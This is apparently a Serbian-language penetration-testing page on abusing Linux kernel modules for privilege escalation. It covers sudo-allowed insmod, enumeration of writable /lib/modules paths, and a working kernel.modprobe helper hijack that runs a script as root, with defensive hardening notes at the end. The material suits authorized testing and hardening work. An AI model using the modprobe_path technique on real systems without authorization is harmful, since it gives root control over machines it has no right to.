# Zloupotreba Kernel modula i modprobe-a

{{#include ../../banners/hacktricks-training.md}}

## Pogrešne konfiguracije Kernel modula i učitavanja modula

Podrška za Kernel module je oblast sa velikim uticajem tokom provere eskalacije privilegija na Linux-u. Nemojte svaku poruku o nepotpisanom modulu automatski smatrati ranjivom, već je koristite za odgovore na praktična pitanja:

- Da li trenutni korisnik može da učitava module putem `sudo`-a, capabilities ili putanje pomoćnog programa sa dozvolom upisivanja?
- Da li je učitavanje modula i dalje omogućeno?
- Da li je enforcement potpisa modula onemogućen?
- Da li direktorijumi modula ili datoteke modula imaju dozvolu upisivanja?
- Da li se mogu čitati Kernel logovi kako bi se potvrdilo šta se dogodilo?

Brza procena:
```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
cat /proc/sys/kernel/module_sig_enforce 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```
Tumačenje:

- `modules_disabled=1` znači da se novi moduli ne mogu učitati do ponovnog pokretanja sistema.
- `module_sig_enforce=1` obično blokira nepotpisane module.
- `dmesg_restrict=0` omogućava neprivilegovanim korisnicima da čitaju kernel logove na mnogim sistemima.
- Putanje sa dozvolom upisa unutar `/lib/modules/$(uname -r)/` su opasne jer otkrivanje modula i automatsko učitavanje mogu verovati tom stablu.

### Učitavanje modula i čitanje kernel izlaza

Ako imate legitimnu dozvolu da učitate lokalni modul, `insmod` ubacuje tačnu `.ko` datoteku koju navedete. Init funkcija modula se odmah izvršava, a poruke zapisane pomoću `printk()` pojavljuju se u kernel logovima.

Minimalni tok rada za potrebe provere ili laboratorijska okruženja:
```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```
Ako `sudo -l` dozvoljava `insmod`, `modprobe` ili wrapper oko njih, smatrajte to kritičnim:
```bash
sudo -l
sudo /sbin/insmod ./example.ko
```
### Sudo-allowed `insmod`

Sudo pravilo koje korisniku omogućava da pokrene `insmod` nije uporedivo sa omogućavanjem pokretanja običnog administrativnog pomoćnog programa. Inicijalizacioni kod modula izvršava se u kontekstu kernela čim se `.ko` ubaci, pa je praktično pitanje pri proveri: „da li ovaj korisnik može da izabere ili izmeni modul koji se učitava?“

Generički tok provere:
```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```
Ako korisnik može da obezbedi proizvoljan `.ko`, to pravilo treba tretirati kao potpunu kompromitaciju sistema tokom ovlašćene procene. Bezbedniji operativni obrazac jeste izbegavanje delegiranja učitavanja modula kroz sudo; ako je to neizbežno, ograničite tačnu putanju, vlasništvo, dozvole, politiku potpisivanja i proceduru uklanjanja.

Za bezopasan obrazac izgradnje modula u kontrolisanoj laboratoriji, minimalni izvorni kod i Makefile izgledaju ovako:
```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
printk(KERN_INFO "demo module loaded\n");
return 0;
}

static void __exit demo_exit(void) {
printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
Izgradite i učitajte samo u ovlašćenoj laboratoriji:
```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```
### Provere zloupotrebe `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` kontroliše userspace helper koji kernel poziva kada mu je potrebna pomoć pri učitavanju modula. Ako napadač može da ga promeni tako da pokazuje na izvršnu datoteku sa mogućnošću upisivanja i izazove nepoznat binarni format ili drugi mehanizam za zahtev učitavanja modula, to može dovesti do izvršavanja koda kao root.

Proverite trenutni helper:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```
Proverite da li možete da utičete na to:
```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```
Generički obrazac namenjen isključivo laboratoriji:
```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger an unknown executable format so the kernel attempts helper logic
printf '\\xff\\xff\\xff\\xff' > /tmp/unknown
chmod +x /tmp/unknown
/tmp/unknown 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```
Na hardened sistemima, ovo bi trebalo da ne uspe jer neprivilegovani korisnici ne mogu da upisuju u `kernel.modprobe`, putanja pomoćnog programa nije upisiva ili su putanje za učitavanje modula blokirane.

### Provera upisivog direktorijuma `/lib/modules`

Upisivi direktorijumi modula mogu omogućiti zamenu modula, postavljanje zlonamernih modula ili zloupotrebu automatskog učitavanja, u zavisnosti od toga kako se `modprobe` kasnije poziva.

Proverite upisive lokacije:
```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```
Ako pronađete sadržaj modula koji je moguće menjati, proverite kako se moduli otkrivaju:
```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```
Odbrambene napomene:

- Održavajte da `/lib/modules` bude u vlasništvu `root:root` i da korisnici nemaju dozvolu za upis.
- Postavite `kernel.modules_disabled=1` nakon boot-a gde je to operativno moguće.
- Primenite potpisivanje modula na sistemima koji zahtevaju module koji se mogu učitavati.
- Nadzirite upise u `/proc/sys/kernel/modprobe`, `/lib/modules` i neočekivano izvršavanje `insmod`/`modprobe`.

{{#include ../../banners/hacktricks-training.md}}
